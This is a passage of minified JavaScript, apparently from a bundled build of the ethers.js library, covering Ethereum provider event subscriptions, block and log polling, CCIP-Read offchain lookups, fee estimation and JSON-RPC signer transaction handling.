this")}start(){A(this,So)||($(this,So,!0),A(this,ec).call(this,-2),A(this,Xa).on("block",A(this,ec)))}stop(){A(this,So)&&($(this,So,!1),A(this,Xa).off("block",A(this,ec)))}pause(e){this.stop()}resume(){this.start()}}Xa=new WeakMap,ec=new WeakMap,So=new WeakMap;var Iu,Ps;class Nre extends V2{constructor(r,n){super(r);H(this,Iu);H(this,Ps);$(this,Iu,n),$(this,Ps,-2)}pause(r){r&&$(this,Ps,-2),super.pause(r)}async _poll(r,n){const i=await n.getBlock(A(this,Iu));i!=null&&(A(this,Ps)===-2?$(this,Ps,i.number):i.number>A(this,Ps)&&(n.emit(A(this,Iu),i.number),$(this,Ps,i.number)))}}Iu=new WeakMap,Ps=new WeakMap;var Lg;class Pre extends V2{constructor(r,n){super(r);H(this,Lg);$(this,Lg,vb(n))}async _poll(r,n){throw new Error("@TODO")}}Lg=new WeakMap;var Su;class kre extends V2{constructor(r,n){super(r);H(this,Su);$(this,Su,n)}async _poll(r,n){const i=await n.getTransactionReceipt(A(this,Su));i&&n.emit(A(this,Su),i)}}Su=new WeakMap;var ks,Nu,Pu,No,Bn,Ug,B7;class W2{constructor(e,r){H(this,Ug);H(this,ks);H(this,Nu);H(this,Pu);H(this,No);H(this,Bn);$(this,ks,e),$(this,Nu,vb(r)),$(this,Pu,Q(this,Ug,B7).bind(this)),$(this,No,!1),$(this,Bn,-2)}start(){A(this,No)||($(this,No,!0),A(this,Bn)===-2&&A(this,ks).getBlockNumber().then(e=>{$(this,Bn,e)}),A(this,ks).on("block",A(this,Pu)))}stop(){A(this,No)&&($(this,No,!1),A(this,ks).off("block",A(this,Pu)))}pause(e){this.stop(),e&&$(this,Bn,-2)}resume(){this.start()}}ks=new WeakMap,Nu=new WeakMap,Pu=new WeakMap,No=new WeakMap,Bn=new WeakMap,Ug=new WeakSet,B7=async function(e){if(A(this,Bn)===-2)return;const r=vb(A(this,Nu));r.fromBlock=A(this,Bn)+1,r.toBlock=e;const n=await A(this,ks).getLogs(r);if(n.length===0){A(this,Bn)<e-60&&$(this,Bn,e-60);return}for(const i of n)A(this,ks).emit(A(this,Nu),i),$(this,Bn,i.blockNumber)};const Ore=BigInt(2),_re=10;function N0(t){return t&&typeof t.then=="function"}function V0(t,e){return t+":"+JSON.stringify(e,(r,n)=>{if(n==null)return"null";if(typeof n=="bigint")return`bigint:${n.toString()}`;if(typeof n=="string")return n.toLowerCase();if(typeof n=="object"&&!Array.isArray(n)){const i=Object.keys(n);return i.sort(),i.reduce((s,o)=>(s[o]=n[o],s),{})}return n})}class L7{constructor(e){j(this,"name");Ce(this,{name:e})}start(){}stop(){}pause(e){}resume(){}}function Tre(t){return JSON.parse(JSON.stringify(t))}function Eb(t){return t=Array.from(new Set(t).values()),t.sort(),t}async function Dm(t,e){if(t==null)throw new Error("invalid event");if(Array.isArray(t)&&(t={topics:t}),typeof t=="string")switch(t){case"block":case"debug":case"error":case"finalized":case"network":case"pending":case"safe":return{type:t,tag:t}}if(gt(t,32)){const r=t.toLowerCase();return{type:"transaction",tag:V0("tx",{hash:r}),hash:r}}if(t.orphan){const r=t;return{type:"orphan",tag:V0("orphan",r),filter:Tre(r)}}if(t.address||t.topics){const r=t,n={topics:(r.topics||[]).map(i=>i==null?null:Array.isArray(i)?Eb(i.map(s=>s.toLowerCase())):i.toLowerCase())};if(r.address){const i=[],s=[],o=a=>{gt(a)?i.push(a):s.push((async()=>{i.push(await Nr(a,e))})())};Array.isArray(r.address)?r.address.forEach(o):o(r.address),s.length&&await Promise.all(s),n.address=Eb(i.map(a=>a.toLowerCase()))}return{filter:n,tag:V0("event",n),type:"event"}}M(!1,"unknown ProviderEvent","event",t)}function Bm(){return new Date().getTime()}const $re={cacheTimeout:250,pollingInterval:4e3};var gr,Po,wr,ku,hn,tc,ko,Os,Df,Ln,Ou,_u,Be,sn,Cb,Ab,md,xb,yd,W0;class Rre{constructor(e,r){H(this,Be);H(this,gr);H(this,Po);H(this,wr);H(this,ku);H(this,hn);H(this,tc);H(this,ko);H(this,Os);H(this,Df);H(this,Ln);H(this,Ou);H(this,_u);if($(this,_u,Object.assign({},$re,r||{})),e==="any")$(this,tc,!0),$(this,hn,null);else if(e){const n=Vi.from(e);$(this,tc,!1),$(this,hn,Promise.resolve(n)),setTimeout(()=>{this.emit("network",n,null)},0)}else $(this,tc,!1),$(this,hn,null);$(this,Os,-1),$(this,ko,new Map),$(this,gr,new Map),$(this,Po,new Map),$(this,wr,null),$(this,ku,!1),$(this,Df,1),$(this,Ln,new Map),$(this,Ou,!1)}get pollingInterval(){return A(this,_u).pollingInterval}get provider(){return this}get plugins(){return Array.from(A(this,Po).values())}attachPlugin(e){if(A(this,Po).get(e.name))throw new Error(`cannot replace existing plugin: ${e.name} `);return A(this,Po).set(e.name,e.connect(this)),this}getPlugin(e){return A(this,Po).get(e)||null}get disableCcipRead(){return A(this,Ou)}set disableCcipRead(e){$(this,Ou,!!e)}async ccipReadFetch(e,r,n){if(this.disableCcipRead||n.length===0||e.to==null)return null;const i=e.to.toLowerCase(),s=r.toLowerCase(),o=[];for(let a=0;a<n.length;a++){const c=n[a],l=c.replace("{sender}",i).replace("{data}",s),u=new Vo(l);c.indexOf("{data}")===-1&&(u.body={data:s,sender:i}),this.emit("debug",{action:"sendCcipReadFetchRequest",request:u,index:a,urls:n});let h="unknown error",d;try{d=await u.send()}catch(f){o.push(f.message),this.emit("debug",{action:"receiveCcipReadFetchError",request:u,result:{error:f}});continue}try{const f=d.bodyJson;if(f.data)return this.emit("debug",{action:"receiveCcipReadFetchResult",request:u,result:f}),f.data;f.message&&(h=f.message),this.emit("debug",{action:"receiveCcipReadFetchError",request:u,result:f})}catch{}K(d.statusCode<400||d.statusCode>=500,`response not found during CCIP fetch: ${h}`,"OFFCHAIN_FAULT",{reason:"404_MISSING_RESOURCE",transaction:e,info:{url:c,errorMessage:h}}),o.push(h)}K(!1,`error encountered during CCIP fetch: ${o.map(a=>JSON.stringify(a)).join(", ")}`,"OFFCHAIN_FAULT",{reason:"500_SERVER_ERROR",transaction:e,info:{urls:n,errorMessages:o}})}_wrapBlock(e,r){return new Xte(yre(e),this)}_wrapLog(e,r){return new cp(wre(e),this)}_wrapTransactionReceipt(e,r){return new C7(Cre(e),this)}_wrapTransactionResponse(e,r){return new xf(D7(e),this)}_detectNetwork(){K(!1,"sub-classes must implement this","UNSUPPORTED_OPERATION",{operation:"_detectNetwork"})}async _perform(e){K(!1,`unsupported method: ${e.method}`,"UNSUPPORTED_OPERATION",{operation:e.method,info:e})}async getBlockNumber(){const e=Re(await Q(this,Be,sn).call(this,{method:"getBlockNumber"}),"%response");return A(this,Os)>=0&&$(this,Os,e),e}_getAddress(e){return Nr(e,this)}_getBlockTag(e){if(e==null)return"latest";switch(e){case"earliest":return"0x0";case"finalized":case"latest":case"pending":case"safe":return e}if(gt(e))return gt(e,32)?e:Ul(e);if(typeof e=="bigint"&&(e=Re(e,"blockTag")),typeof e=="number")return e>=0?Ul(e):A(this,Os)>=0?Ul(A(this,Os)+e):this.getBlockNumber().then(r=>Ul(r+e));M(!1,"invalid blockTag","blockTag",e)}_getFilter(e){const r=(e.topics||[]).map(c=>c==null?null:Array.isArray(c)?Eb(c.map(l=>l.toLowerCase())):c.toLowerCase()),n="blockHash"in e?e.blockHash:void 0,i=(c,l,u)=>{let h;switch(c.length){case 0:break;case 1:h=c[0];break;default:c.sort(),h=c}if(n&&(l!=null||u!=null))throw new Error("invalid filter");const d={};return h&&(d.address=h),r.length&&(d.topics=r),l&&(d.fromBlock=l),u&&(d.toBlock=u),n&&(d.blockHash=n),d};let s=[];if(e.address)if(Array.isArray(e.address))for(const c of e.address)s.push(this._getAddress(c));else s.push(this._getAddress(e.address));let o;"fromBlock"in e&&(o=this._getBlockTag(e.fromBlock));let a;return"toBlock"in e&&(a=this._getBlockTag(e.toBlock)),s.filter(c=>typeof c!="string").length||o!=null&&typeof o!="string"||a!=null&&typeof a!="string"?Promise.all([Promise.all(s),o,a]).then(c=>i(c[0],c[1],c[2])):i(s,o,a)}_getTransactionRequest(e){const r=Pg(e),n=[];if(["to","from"].forEach(i=>{if(r[i]==null)return;const s=Nr(r[i],this);N0(s)?n.push(async function(){r[i]=await s}()):r[i]=s}),r.blockTag!=null){const i=this._getBlockTag(r.blockTag);N0(i)?n.push(async function(){r.blockTag=await i}()):r.blockTag=i}return n.length?async function(){return await Promise.all(n),r}():r}async getNetwork(){if(A(this,hn)==null){const i=(async()=>{try{const s=await this._detectNetwork();return this.emit("network",s,null),s}catch(s){throw A(this,hn)===i&&$(this,hn,null),s}})();return $(this,hn,i),(await i).clone()}const e=A(this,hn),[r,n]=await Promise.all([e,this._detectNetwork()]);return r.chainId!==n.chainId&&(A(this,tc)?(this.emit("network",n,r),A(this,hn)===e&&$(this,hn,Promise.resolve(n))):K(!1,`network changed: ${r.chainId} => ${n.chainId} `,"NETWORK_ERROR",{event:"changed"})),r.clone()}async getFeeData(){const e=await this.getNetwork(),r=async()=>{const{_block:i,gasPrice:s,priorityFee:o}=await Ar({_block:Q(this,Be,xb).call(this,"latest",!1),gasPrice:(async()=>{try{const u=await Q(this,Be,sn).call(this,{method:"getGasPrice"});return ge(u,"%response")}catch{}return null})(),priorityFee:(async()=>{try{const u=await Q(this,Be,sn).call(this,{method:"getPriorityFee"});return ge(u,"%response")}catch{}return null})()});let a=null,c=null;const l=this._wrapBlock(i,e);return l&&l.baseFeePerGas&&(c=o??BigInt("1000000000"),a=l.baseFeePerGas*Ore+c),new D6(s,a,c)},n=e.getPlugin("org.ethers.plugins.network.FetchUrlFeeDataPlugin");if(n){const i=new Vo(n.url),s=await n.processFunc(r,this,i);return new D6(s.gasPrice,s.maxFeePerGas,s.maxPriorityFeePerGas)}return await r()}async estimateGas(e){let r=this._getTransactionRequest(e);return N0(r)&&(r=await r),ge(await Q(this,Be,sn).call(this,{method:"estimateGas",transaction:r}),"%response")}async call(e){const{tx:r,blockTag:n}=await Ar({tx:this._getTransactionRequest(e),blockTag:this._getBlockTag(e.blockTag)});return await Q(this,Be,Ab).call(this,Q(this,Be,Cb).call(this,r,n,e.enableCcipRead?0:-1))}async getBalance(e,r){return ge(await Q(this,Be,md).call(this,{method:"getBalance"},e,r),"%response")}async getTransactionCount(e,r){return Re(await Q(this,Be,md).call(this,{method:"getTransactionCount"},e,r),"%response")}async getCode(e,r){return ue(await Q(this,Be,md).call(this,{method:"getCode"},e,r))}async getStorage(e,r,n){const i=ge(r,"position");return ue(await Q(this,Be,md).call(this,{method:"getStorage",position:i},e,n))}async broadcastTransaction(e){const{blockNumber:r,hash:n,network:i}=await Ar({blockNumber:this.getBlockNumber(),hash:this._perform({method:"broadcastTransaction",signedTransaction:e}),network:this.getNetwork()}),s=Sg.from(e);if(s.hash!==n)throw new Error("@TODO: the returned hash did not match");return this._wrapTransactionResponse(s,i).replaceableTransaction(r)}async getBlock(e,r){const{network:n,params:i}=await Ar({network:this.getNetwork(),params:Q(this,Be,xb).call(this,e,!!r)});return i==null?null:this._wrapBlock(i,n)}async getTransaction(e){const{network:r,params:n}=await Ar({network:this.getNetwork(),params:Q(this,Be,sn).call(this,{method:"getTransaction",hash:e})});return n==null?null:this._wrapTransactionResponse(n,r)}async getTransactionReceipt(e){const{network:r,params:n}=await Ar({network:this.getNetwork(),params:Q(this,Be,sn).call(this,{method:"getTransactionReceipt",hash:e})});if(n==null)return null;if(n.gasPrice==null&&n.effectiveGasPrice==null){const i=await Q(this,Be,sn).call(this,{method:"getTransaction",hash:e});if(i==null)throw new Error("report this; could not find tx or effectiveGasPrice");n.effectiveGasPrice=i.gasPrice}return this._wrapTransactionReceipt(n,r)}async getTransactionResult(e){const{result:r}=await Ar({network:this.getNetwork(),result:Q(this,Be,sn).call(this,{method:"getTransactionResult",hash:e})});return r==null?null:ue(r)}async getLogs(e){let r=this._getFilter(e);N0(r)&&(r=await r);const{network:n,params:i}=await Ar({network:this.getNetwork(),params:Q(this,Be,sn).call(this,{method:"getLogs",filter:r})});return i.map(s=>this._wrapLog(s,n))}_getProvider(e){K(!1,"provider cannot connect to target network","UNSUPPORTED_OPERATION",{operation:"_getProvider()"})}async getResolver(e){return await Og.fromName(this,e)}async getAvatar(e){const r=await this.getResolver(e);return r?await r.getAvatar():null}async resolveName(e){const r=await this.getResolver(e);return r?await r.getAddress():null}async lookupAddress(e){e=ot(e);const r=pb(e.substring(2).toLowerCase()+".addr.reverse");try{const n=await Og.getEnsAddress(this),s=await new gc(n,["function resolver(bytes32) view returns (address)"],this).resolver(r);if(s==null||s===wf)return null;const a=await new gc(s,["function name(bytes32) view returns (string)"],this).name(r);return await this.resolveName(a)!==e?null:a}catch(n){if(or(n,"BAD_DATA")&&n.value==="0x"||or(n,"CALL_EXCEPTION"))return null;throw n}return null}async waitForTransaction(e,r,n){const i=r??1;return i===0?this.getTransactionReceipt(e):new Promise(async(s,o)=>{let a=null;const c=async l=>{try{const u=await this.getTransactionReceipt(e);if(u!=null&&l-u.blockNumber+1>=i){s(u),a&&(clearTimeout(a),a=null);return}}catch(u){console.log("EEE",u)}this.once("block",c)};n!=null&&(a=setTimeout(()=>{a!=null&&(a=null,this.off("block",c),o(Et("timeout","TIMEOUT",{reason:"timeout"})))},n)),c(await this.getBlockNumber())})}async waitForBlock(e){K(!1,"not implemented yet","NOT_IMPLEMENTED",{operation:"waitForBlock"})}_clearTimeout(e){const r=A(this,Ln).get(e);r&&(r.timer&&clearTimeout(r.timer),A(this,Ln).delete(e))}_setTimeout(e,r){r==null&&(r=0);const n=mh(this,Df)._++,i=()=>{A(this,Ln).delete(n),e()};if(this.paused)A(this,Ln).set(n,{timer:null,func:i,time:r});else{const s=setTimeout(i,r);A(this,Ln).set(n,{timer:s,func:i,time:Bm()})}return n}_forEachSubscriber(e){for(const r of A(this,gr).values())e(r.subscriber)}_getSubscriber(e){switch(e.type){case"debug":case"error":case"network":return new L7(e.type);case"block":{const r=new Sre(this);return r.pollingInterval=this.pollingInterval,r}case"safe":case"finalized":return new Nre(this,e.type);case"event":return new W2(this,e.filter);case"transaction":return new kre(this,e.hash);case"orphan":return new Pre(this,e.filter)}throw new Error(`unsupported event: ${e.type}`)}_recoverSubscriber(e,r){for(const n of A(this,gr).values())if(n.subscriber===e){n.started&&n.subscriber.stop(),n.subscriber=r,n.started&&r.start(),A(this,wr)!=null&&r.pause(A(this,wr));break}}async on(e,r){const n=await Q(this,Be,W0).call(this,e);return n.listeners.push({listener:r,once:!1}),n.started||(n.subscriber.start(),n.started=!0,A(this,wr)!=null&&n.subscriber.pause(A(this,wr))),this}async once(e,r){const n=await Q(this,Be,W0).call(this,e);return n.listeners.push({listener:r,once:!0}),n.started||(n.subscriber.start(),n.started=!0,A(this,wr)!=null&&n.subscriber.pause(A(this,wr))),this}async emit(e,...r){const n=await Q(this,Be,yd).call(this,e,r);if(!n||n.listeners.length===0)return!1;const i=n.listeners.length;return n.listeners=n.listeners.filter(({listener:s,once:o})=>{const a=new X9(this,o?null:s,e);try{s.call(this,...r,a)}catch{}return!o}),n.listeners.length===0&&(n.started&&n.subscriber.stop(),A(this,gr).delete(n.tag)),i>0}async listenerCount(e){if(e){const n=await Q(this,Be,yd).call(this,e);return n?n.listeners.length:0}let r=0;for(const{listeners:n}of A(this,gr).values())r+=n.length;return r}async listeners(e){if(e){const n=await Q(this,Be,yd).call(this,e);return n?n.listeners.map(({listener:i})=>i):[]}let r=[];for(const{listeners:n}of A(this,gr).values())r=r.concat(n.map(({listener:i})=>i));return r}async off(e,r){const n=await Q(this,Be,yd).call(this,e);if(!n)return this;if(r){const i=n.listeners.map(({listener:s})=>s).indexOf(r);i>=0&&n.listeners.splice(i,1)}return(!r||n.listeners.length===0)&&(n.started&&n.subscriber.stop(),A(this,gr).delete(n.tag)),this}async removeAllListeners(e){if(e){const{tag:r,started:n,subscriber:i}=await Q(this,Be,W0).call(this,e);n&&i.stop(),A(this,gr).delete(r)}else for(const[r,{started:n,subscriber:i}]of A(this,gr))n&&i.stop(),A(this,gr).delete(r);return this}async addListener(e,r){return await this.on(e,r)}async removeListener(e,r){return this.off(e,r)}get destroyed(){return A(this,ku)}destroy(){this.removeAllListeners();for(const e of A(this,Ln).keys())this._clearTimeout(e);$(this,ku,!0)}get paused(){return A(this,wr)!=null}set paused(e){!!e!==this.paused&&(this.paused?this.resume():this.pause(!1))}pause(e){if($(this,Os,-1),A(this,wr)!=null){if(A(this,wr)==!!e)return;K(!1,"cannot change pause type; resume first","UNSUPPORTED_OPERATION",{operation:"pause"})}this._forEachSubscriber(r=>r.pause(e)),$(this,wr,!!e);for(const r of A(this,Ln).values())r.timer&&clearTimeout(r.timer),r.time=Bm()-r.time}resume(){if(A(this,wr)!=null){this._forEachSubscriber(e=>e.resume()),$(this,wr,null);for(const e of A(this,Ln).values()){let r=e.time;r<0&&(r=0),e.time=Bm(),setTimeout(e.func,r)}}}}gr=new WeakMap,Po=new WeakMap,wr=new WeakMap,ku=new WeakMap,hn=new WeakMap,tc=new WeakMap,ko=new WeakMap,Os=new WeakMap,Df=new WeakMap,Ln=new WeakMap,Ou=new WeakMap,_u=new WeakMap,Be=new WeakSet,sn=async function(e){const r=A(this,_u).cacheTimeout;if(r<0)return await this._perform(e);const n=V0(e.method,e);let i=A(this,ko).get(n);return i||(i=this._perform(e),A(this,ko).set(n,i),setTimeout(()=>{A(this,ko).get(n)===i&&A(this,ko).delete(n)},r)),await i},Cb=async function(e,r,n){K(n<_re,"CCIP read exceeded maximum redirections","OFFCHAIN_FAULT",{reason:"TOO_MANY_REDIRECTS",transaction:Object.assign({},e,{blockTag:r,enableCcipRead:!0})});const i=Pg(e);try{return ue(await this._perform({method:"call",transaction:i,blockTag:r}))}catch(s){if(!this.disableCcipRead&&I2(s)&&s.data&&n>=0&&r==="latest"&&i.to!=null&&Ct(s.data,0,4)==="0x556f1830"){const o=s.data,a=await Nr(i.to,this);let c;try{c=Mre(Ct(s.data,4))}catch(h){K(!1,h.message,"OFFCHAIN_FAULT",{reason:"BAD_DATA",transaction:i,info:{data:o}})}K(c.sender.toLowerCase()===a.toLowerCase(),"CCIP Read sender mismatch","CALL_EXCEPTION",{action:"call",data:o,reason:"OffchainLookup",transaction:i,invocation:null,revert:{signature:"OffchainLookup(address,string[],bytes,bytes4,bytes)",name:"OffchainLookup",args:c.errorArgs}});const l=await this.ccipReadFetch(i,c.calldata,c.urls);K(l!=null,"CCIP Read failed to fetch data","OFFCHAIN_FAULT",{reason:"FETCH_FAILED",transaction:i,info:{data:s.data,errorArgs:c.errorArgs}});const u={to:a,data:Ot([c.selector,Ure([l,c.extraData])])};this.emit("debug",{action:"sendCcipReadCall",transaction:u});try{const h=await Q(this,Be,Cb).call(this,u,r,n+1);return this.emit("debug",{action:"receiveCcipReadCallResult",transaction:Object.assign({},u),result:h}),h}catch(h){throw this.emit("debug",{action:"receiveCcipReadCallError",transaction:Object.assign({},u),error:h}),h}}throw s}},Ab=async function(e){const{value:r}=await Ar({network:this.getNetwork(),value:e});return r},md=async function(e,r,n){let i=this._getAddress(r),s=this._getBlockTag(n);return(typeof i!="string"||typeof s!="string")&&([i,s]=await Promise.all([i,s])),await Q(this,Be,Ab).call(this,Q(this,Be,sn).call(this,Object.assign(e,{address:i,blockTag:s})))},xb=async function(e,r){if(gt(e,32))return await Q(this,Be,sn).call(this,{method:"getBlock",blockHash:e,includeTransactions:r});let n=this._getBlockTag(e);return typeof n!="string"&&(n=await n),await Q(this,Be,sn).call(this,{method:"getBlock",blockTag:n,includeTransactions:r})},yd=async function(e,r){let n=await Dm(e,this);return n.type==="event"&&r&&r.length>0&&r[0].removed===!0&&(n=await Dm({orphan:"drop-log",log:r[0]},this)),A(this,gr).get(n.tag)||null},W0=async function(e){const r=await Dm(e,this),n=r.tag;let i=A(this,gr).get(n);return i||(i={subscriber:this._getSubscriber(r),tag:n,addressableMap:new WeakMap,nameMap:new Map,started:!1,listeners:[]},A(this,gr).set(n,i)),i};function Dre(t,e){try{const r=Ib(t,e);if(r)return bg(r)}catch{}return null}function Ib(t,e){if(t==="0x")return null;try{const r=Re(Ct(t,e,e+32)),n=Re(Ct(t,r,r+32));return Ct(t,r+32,r+32+n)}catch{}return null}function H6(t){const e=Ir(t);if(e.length>32)throw new Error("internal; should not happen");const r=new Uint8Array(32);return r.set(e,32-e.length),r}function Bre(t){if(t.length%32===0)return t;const e=new Uint8Array(Math.ceil(t.length/32)*32);return e.set(t),e}const Lre=new Uint8Array([]);function Ure(t){const e=[];let r=0;for(let n=0;n<t.length;n++)e.push(Lre),r+=32;for(let n=0;n<t.length;n++){const i=Ve(t[n]);e[n]=H6(r),e.push(H6(i.length)),e.push(Bre(i)),r+=32+Math.ceil(i.length/32)*32}return Ot(e)}const q6="0x0000000000000000000000000000000000000000000000000000000000000000";function Mre(t){const e={sender:"",urls:[],calldata:"",selector:"",extraData:"",errorArgs:[]};K(Wl(t)>=5*32,"insufficient OffchainLookup data","OFFCHAIN_FAULT",{reason:"insufficient OffchainLookup data"});const r=Ct(t,0,32);K(Ct(r,0,12)===Ct(q6,0,12),"corrupt OffchainLookup sender","OFFCHAIN_FAULT",{reason:"corrupt OffchainLookup sender"}),e.sender=Ct(r,12);try{const n=[],i=Re(Ct(t,32,64)),s=Re(Ct(t,i,i+32)),o=Ct(t,i+32);for(let a=0;a<s;a++){const c=Dre(o,a*32);if(c==null)throw new Error("abort");n.push(c)}e.urls=n}catch{K(!1,"corrupt OffchainLookup urls","OFFCHAIN_FAULT",{reason:"corrupt OffchainLookup urls"})}try{const n=Ib(t,64);if(n==null)throw new Error("abort");e.calldata=n}catch{K(!1,"corrupt OffchainLookup calldata","OFFCHAIN_FAULT",{reason:"corrupt OffchainLookup calldata"})}K(Ct(t,100,128)===Ct(q6,0,28),"corrupt OffchainLookup callbaackSelector","OFFCHAIN_FAULT",{reason:"corrupt OffchainLookup callbaackSelector"}),e.selector=Ct(t,96,100);try{const n=Ib(t,128);if(n==null)throw new Error("abort");e.extraData=n}catch{K(!1,"corrupt OffchainLookup extraData","OFFCHAIN_FAULT",{reason:"corrupt OffchainLookup extraData"})}return e.errorArgs="sender,urls,calldata,selector,extraData".split(/,/).map(n=>e[n]),e}function yl(t,e){if(t.provider)return t.provider;K(!1,"missing provider","UNSUPPORTED_OPERATION",{operation:e})}async function V6(t,e){let r=Pg(e);if(r.to!=null&&(r.to=Nr(r.to,t)),r.from!=null){const n=r.from;r.from=Promise.all([t.getAddress(),Nr(n,t)]).then(([i,s])=>(M(i.toLowerCase()===s.toLowerCase(),"transaction from mismatch","tx.from",s),i))}else r.from=t.getAddress();return await Ar(r)}class Fre{constructor(e){j(this,"provider");Ce(this,{provider:e||null})}async getNonce(e){return yl(this,"getTransactionCount").getTransactionCount(await this.getAddress(),e)}async populateCall(e){return await V6(this,e)}async populateTransaction(e){const r=yl(this,"populateTransaction"),n=await V6(this,e);n.nonce==null&&(n.nonce=await this.getNonce("pending")),n.gasLimit==null&&(n.gasLimit=await this.estimateGas(n));const i=await this.provider.getNetwork();if(n.chainId!=null){const o=ge(n.chainId);M(o===i.chainId,"transaction chainId mismatch","tx.chainId",e.chainId)}else n.chainId=i.chainId;const s=n.maxFeePerGas!=null||n.maxPriorityFeePerGas!=null;if(n.gasPrice!=null&&(n.type===2||s)?M(!1,"eip-1559 transaction do not support gasPrice","tx",e):(n.type===0||n.type===1)&&s&&M(!1,"pre-eip-1559 transaction do not support maxFeePerGas/maxPriorityFeePerGas","tx",e),(n.type===2||n.type==null)&&n.maxFeePerGas!=null&&n.maxPriorityFeePerGas!=null)n.type=2;else if(n.type===0||n.type===1){const o=await r.getFeeData();K(o.gasPrice!=null,"network does not support gasPrice","UNSUPPORTED_OPERATION",{operation:"getGasPrice"}),n.gasPrice==null&&(n.gasPrice=o.gasPrice)}else{const o=await r.getFeeData();if(n.type==null)if(o.maxFeePerGas!=null&&o.maxPriorityFeePerGas!=null)if(n.type=2,n.gasPrice!=null){const a=n.gasPrice;delete n.gasPrice,n.maxFeePerGas=a,n.maxPriorityFeePerGas=a}else n.maxFeePerGas==null&&(n.maxFeePerGas=o.maxFeePerGas),n.maxPriorityFeePerGas==null&&(n.maxPriorityFeePerGas=o.maxPriorityFeePerGas);else o.gasPrice!=null?(K(!s,"network does not support EIP-1559","UNSUPPORTED_OPERATION",{operation:"populateTransaction"}),n.gasPrice==null&&(n.gasPrice=o.gasPrice),n.type=0):K(!1,"failed to get consistent fee data","UNSUPPORTED_OPERATION",{operation:"signer.getFeeData"});else(n.type===2||n.type===3)&&(n.maxFeePerGas==null&&(n.maxFeePerGas=o.maxFeePerGas),n.maxPriorityFeePerGas==null&&(n.maxPriorityFeePerGas=o.maxPriorityFeePerGas))}return await Ar(n)}async estimateGas(e){return yl(this,"estimateGas").estimateGas(await this.populateCall(e))}async call(e){return yl(this,"call").call(await this.populateCall(e))}async resolveName(e){return await yl(this,"resolveName").resolveName(e)}async sendTransaction(e){const r=yl(this,"sendTransaction"),n=await this.populateTransaction(e);delete n.from;const i=Sg.from(n);return await r.broadcastTransaction(await this.signTransaction(i))}}function zre(t){return JSON.parse(JSON.stringify(t))}var Cr,Li,rc,Oo,nc,Tu,Wo,Sb,Nb;class U7{constructor(e){H(this,Wo);H(this,Cr);H(this,Li);H(this,rc);H(this,Oo);H(this,nc);H(this,Tu);$(this,Cr,e),$(this,Li,null),$(this,rc,Q(this,Wo,Sb).bind(this)),$(this,Oo,!1),$(this,nc,null),$(this,Tu,!1)}_subscribe(e){throw new Error("subclasses must override this")}_emitResults(e,r){throw new Error("subclasses must override this")}_recover(e){throw new Error("subclasses must override this")}start(){A(this,Oo)||($(this,Oo,!0),Q(this,Wo,Sb).call(this,-2))}stop(){A(this,Oo)&&($(this,Oo,!1),$(this,Tu,!0),Q(this,Wo,Nb).call(this),A(this,Cr).off("block",A(this,rc)))}pause(e){e&&Q(this,Wo,Nb).call(this),A(this,Cr).off("block",A(this,rc))}resume(){this.start()}}Cr=new WeakMap,Li=new WeakMap,rc=new WeakMap,Oo=new WeakMap,nc=new WeakMap,Tu=new WeakMap,Wo=new WeakSet,Sb=async function(e){try{A(this,Li)==null&&$(this,Li,this._subscribe(A(this,Cr)));let r=null;try{r=await A(this,Li)}catch(s){if(!or(s,"UNSUPPORTED_OPERATION")||s.operation!=="eth_newFilter")throw s}if(r==null){$(this,Li,null),A(this,Cr)._recoverSubscriber(this,this._recover(A(this,Cr)));return}const n=await A(this,Cr).getNetwork();if(A(this,nc)||$(this,nc,n),A(this,nc).chainId!==n.chainId)throw new Error("chaid changed");if(A(this,Tu))return;const i=await A(this,Cr).send("eth_getFilterChanges",[r]);await this._emitResults(A(this,Cr),i)}catch(r){console.log("@TODO",r)}A(this,Cr).once("block",A(this,rc))},Nb=function(){const e=A(this,Li);e&&($(this,Li,null),e.then(r=>{A(this,Cr).destroyed||A(this,Cr).send("eth_uninstallFilter",[r])}))};var ic;class jre extends U7{constructor(r,n){super(r);H(this,ic);$(this,ic,zre(n))}_recover(r){return new W2(r,A(this,ic))}async _subscribe(r){return await r.send("eth_newFilter",[A(this,ic)])}async _emitResults(r,n){for(const i of n)r.emit(A(this,ic),r._wrapLog(i,r._network))}}ic=new WeakMap;class Hre extends U7{async _subscribe(e){return await e.send("eth_newPendingTransactionFilter",[])}async _emitResults(e,r){for(const n of r)e.emit("pending",n)}}const qre="bigint,boolean,function,number,string,symbol".split(/,/g);function G0(t){if(t==null||qre.indexOf(typeof t)>=0||typeof t.getAddress=="function")return t;if(Array.isArray(t))return t.map(G0);if(typeof t=="object")return Object.keys(t).reduce((e,r)=>(e[r]=t[r],e),{});throw new Error(`should not happen: ${t} (${typeof t})`)}function Vre(t){return new Promise(e=>{setTimeout(e,t)})}function bl(t){return t&&t.toLowerCase()}function W6(t){return t&&typeof t.pollingInterval=="number"}const M7={polling:!1,staticNetwork:null,batchStallTime:10,batchMaxSize:1<<20,batchMaxCount:100,cacheTimeout:250,pollingInterval:4e3};class Lm extends Fre{constructor(r,n){super(r);j(this,"address");n=ot(n),Ce(this,{address:n})}connect(r){K(!1,"cannot reconnect JsonRpcSigner","UNSUPPORTED_OPERATION",{operation:"signer.connect"})}async getAddress(){return this.address}async populateTransaction(r){return await this.populateCall(r)}async sendUncheckedTransaction(r){const n=G0(r),i=[];if(n.from){const o=n.from;i.push((async()=>{const a=await Nr(o,this.provider);M(a!=null&&a.toLowerCase()===this.address.toLowerCase(),"from address mismatch","transaction",r),n.from=a})())}else n.from=this.address;if(n.gasLimit==null&&i.push((async()=>{n.gasLimit=await this.provider.estimateGas({...n,from:this.address})})()),n.to!=null){const o=n.to;i.push((async()=>{n.to=await Nr(o,this.provider)})())}i.length&&await Promise.all(i);const s=this.provider.getRpcTransaction(n);return this.provider.send("eth_sendTransaction",[s])}async sendTransaction(r){const n=await this.provider.getBlockNumber(),i=await this.sendUncheckedTransaction(r);return await new Promise((s,o)=>{const a=[1e3,100];let c=0;const l=async()=>{try{const u=await this.provider.getTransaction(i);if(u!=null){s(u.replaceableTransaction(n));return}}catch(u){if(or(u,"CANCELLED")||or(u,"BAD_DATA")||or(u,"NETWORK_ERROR")||or(u,"UNSUPPORTED_OPERATION")){u.info==null&&(u.info={}),u.info.sendTransactionHash=i,o(u);return}if(or(u,"INVALID_ARGUMENT")&&(c++,u.info==null&&(u.info={}),u.info.sendTransactionHash=i,c>10)){o(u);return}this.provider.emit("error",Et("failed to fetch transation after sending (will try again)","UNKNOWN_ERROR",{error:u}))}this.provider._setTimeout(()=>{l()},a.pop()||4e3)};l()})}async signTransaction(r){const n=G0(r);if(n.from){const s=await 